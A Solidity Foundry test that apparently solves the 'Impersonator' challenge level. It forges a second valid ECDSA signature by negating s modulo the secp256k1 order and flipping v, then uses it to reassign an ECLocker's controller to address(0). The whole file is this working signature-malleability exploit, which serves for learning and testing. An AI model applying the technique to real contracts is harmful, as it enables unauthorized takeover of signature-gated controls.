// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./ImpersonatorFactory.sol";

contract ImpersonatorTest is Test {
    ImpersonatorFactory factory;

    function setUp() public {
        factory = new ImpersonatorFactory();
    }

    function testImpersonator() public {
        Impersonator impersonator = Impersonator(factory.createInstance(address(this)));

        uint256 secp256k1_n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;

        // get the signature from the factory
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;
        uint8 v = 27;

        s = bytes32(secp256k1_n - uint256(s));
        v = v == 27 ? 28 : 27;

        ECLocker locker = impersonator.lockers(0);
        locker.changeController(v, r, s, address(0));

        assertTrue(factory.validateInstance(payable(address(impersonator)), address(this)));
    }
}
